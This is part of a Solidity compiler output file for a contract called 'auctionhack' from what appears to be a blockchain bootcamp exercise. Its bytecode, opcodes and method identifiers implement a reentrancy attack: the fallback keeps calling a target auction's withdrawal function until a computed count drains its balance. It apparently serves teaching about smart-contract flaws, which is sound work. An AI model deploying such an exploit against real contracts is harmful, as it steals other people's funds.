tag_112:\n        /* \"#utility.yul\":3297:3322   */\n      swap3\n      pop\n        /* \"#utility.yul\":3346:3347   */\n      dup3\n        /* \"#utility.yul\":3343:3344   */\n      dup3\n        /* \"#utility.yul\":3339:3348   */\n      sub\n        /* \"#utility.yul\":3331:3348   */\n      swap1\n      pop\n        /* \"#utility.yul\":3370:3371   */\n      dup2\n        /* \"#utility.yul\":3364:3368   */\n      dup2\n        /* \"#utility.yul\":3361:3372   */\n      gt\n        /* \"#utility.yul\":3358:3395   */\n      iszero\n      tag_113\n      jumpi\n        /* \"#utility.yul\":3375:3393   */\n      tag_114\n      tag_52\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":3358:3395   */\n    tag_113:\n        /* \"#utility.yul\":3208:3402   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220fbc8eb303c3c3bd9412e4e4d889f58cb4e6dd47786585f37a1e145803b0e352764736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600060025534801561001557600080fd5b50604051610727380380610727833981810160405281019061003791906100e0565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061010d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ad82610082565b9050919050565b6100bd816100a2565b81146100c857600080fd5b50565b6000815190506100da816100b4565b92915050565b6000602082840312156100f6576100f561007d565b5b6000610104848285016100cb565b91505092915050565b61060b8061011c6000396000f3fe60806040526004361061004e5760003560e01c80631998aeef146100f857806381fe771914610102578063a92100cb1461012d578063e29e271d14610158578063fd1928201461016f5761004f565b5b60015460025410156100f65760016002600082825461006e91906103eb565b9250508190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636faf03976040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100dd57600080fd5b505af11580156100f1573d6000803e3d6000fd5b505050505b005b61010061019a565b005b34801561010e57600080fd5b5061011761021d565b604051610124919061049e565b60405180910390f35b34801561013957600080fd5b50610142610241565b60405161014f91906104c8565b60405180910390f35b34801561016457600080fd5b5061016d610247565b005b34801561017b57600080fd5b506101846103ac565b60405161019191906104c8565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631998aeef346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020257600080fd5b505af1158015610216573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b600160008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b8152600401602060405180830381865afa1580156102b4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102d89190610514565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163161031a9190610570565b61032491906105a1565b60018190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636faf03976040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561039257600080fd5b505af11580156103a6573d6000803e3d6000fd5b50505050565b60015481565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103f6826103b2565b9150610401836103b2565b9250828201905080821115610419576104186103bc565b5b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061046461045f61045a8461041f565b61043f565b61041f565b9050919050565b600061047682610449565b9050919050565b60006104888261046b565b9050919050565b6104988161047d565b82525050565b60006020820190506104b3600083018461048f565b92915050565b6104c2816103b2565b82525050565b60006020820190506104dd60008301846104b9565b92915050565b600080fd5b6104f1816103b2565b81146104fc57600080fd5b50565b60008151905061050e816104e8565b92915050565b60006020828403121561052a576105296104e3565b5b6000610538848285016104ff565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061057b826103b2565b9150610586836103b2565b92508261059657610595610541565b5b828204905092915050565b60006105ac826103b2565b91506105b7836103b2565b92508282039050818111156105cf576105ce6103bc565b5b9291505056fea2646970667358221220fbc8eb303c3c3bd9412e4e4d889f58cb4e6dd47786585f37a1e145803b0e352764736f6c63430008110033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x15 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x727 CODESIZE SUB DUP1 PUSH2 0x727 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x37 SWAP2 SWAP1 PUSH2 0xE0 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x10D JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xAD DUP3 PUSH2 0x82 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xBD DUP2 PUSH2 0xA2 JUMP JUMPDEST DUP2 EQ PUSH2 0xC8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xDA DUP2 PUSH2 0xB4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF6 JUMPI PUSH2 0xF5 PUSH2 0x7D JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x104 DUP5 DUP3 DUP6 ADD PUSH2 0xCB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x60B DUP1 PUSH2 0x11C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1998AEEF EQ PUSH2 0xF8 JUMPI DUP1 PUSH4 0x81FE7719 EQ PUSH2 0x102 JUMPI DUP1 PUSH4 0xA92100CB EQ PUSH2 0x12D JUMPI DUP1 PUSH4 0xE29E271D EQ PUSH2 0x158 JUMPI DUP1 PUSH4 0xFD192820 EQ PUSH2 0x16F JUMPI PUSH2 0x4F JUMP JUMPDEST JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x2 SLOAD LT ISZERO PUSH2 0xF6 JUMPI PUSH1 0x1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x3EB JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6FAF0397 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH2 0x100 PUSH2 0x19A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x117 PUSH2 0x21D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x124 SWAP2 SWAP1 PUSH2 0x49E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x139 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x142 PUSH2 0x241 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14F SWAP2 SWAP1 PUSH2 0x4C8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x164 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH2 0x247 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x17B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x184 PUSH2 0x3AC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x191 SWAP2 SWAP1 PUSH2 0x4C8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1998AEEF CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x202 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x216 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12065FE0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2B4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2D8 SWAP2 SWAP1 PUSH2 0x514 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH2 0x31A SWAP2 SWAP1 PUSH2 0x570 JUMP JUMPDEST PUSH2 0x324 SWAP2 SWAP1 PUSH2 0x5A1 JUMP JUMPDEST PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6FAF0397 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x392 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3A6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x3F6 DUP3 PUSH2 0x3B2 JUMP JUMPDEST SWAP2 POP PUSH2 0x401 DUP4 PUSH2 0x3B2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x419 JUMPI PUSH2 0x418 PUSH2 0x3BC JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x464 PUSH2 0x45F PUSH2 0x45A DUP5 PUSH2 0x41F JUMP JUMPDEST PUSH2 0x43F JUMP JUMPDEST PUSH2 0x41F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x476 DUP3 PUSH2 0x449 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x488 DUP3 PUSH2 0x46B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x498 DUP2 PUSH2 0x47D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4B3 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x48F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4C2 DUP2 PUSH2 0x3B2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4DD PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x4B9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4F1 DUP2 PUSH2 0x3B2 JUMP JUMPDEST DUP2 EQ PUSH2 0x4FC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x50E DUP2 PUSH2 0x4E8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x52A JUMPI PUSH2 0x529 PUSH2 0x4E3 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x538 DUP5 DUP3 DUP6 ADD PUSH2 0x4FF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x57B DUP3 PUSH2 0x3B2 JUMP JUMPDEST SWAP2 POP PUSH2 0x586 DUP4 PUSH2 0x3B2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x596 JUMPI PUSH2 0x595 PUSH2 0x541 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5AC DUP3 PUSH2 0x3B2 JUMP JUMPDEST SWAP2 POP PUSH2 0x5B7 DUP4 PUSH2 0x3B2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x5CF JUMPI PUSH2 0x5CE PUSH2 0x3BC JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xFB 0xC8 0xEB ADDRESS EXTCODECOPY EXTCODECOPY EXTCODESIZE 0xD9 COINBASE 0x2E 0x4E 0x4D DUP9 SWAP16 PC 0xCB 0x4E PUSH14 0xD47786585F37A1E145803B0E3527 PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "309400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"auctioncontract()": "infinite",
						"bid()": "infinite",
						"loop()": "2451",
						"loopCounter()": "2495",
						"takeOut2()": "infinite"
					}
				},
				"methodIdentifiers": {
					"auctioncontract()": "81fe7719",
					"bid()": "1998aeef",
					"loop()": "a92100cb",
					"loopCounter()": "fd192820",
					"takeOut2()": "e29e271d"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 16,
						"contract": "bootcamp/week9/day_2_Auction_Hack.sol:auctionhack",
						"label": "auctioncontract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(auction)13"
					},
					{
						"astId": 18,
						"contract": "bootcamp/week9/day_2_Auction_Hack.sol:auctionhack",
						"label": "loopCounter",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					},
					{
						"astId": 21,
						"contract": "bootcamp/week9/day_2_Auction_Hack.sol:auctionhack",
						"label": "loop",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(auction)13": {
						"encoding": "inplace",
						"label": "contract auction",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}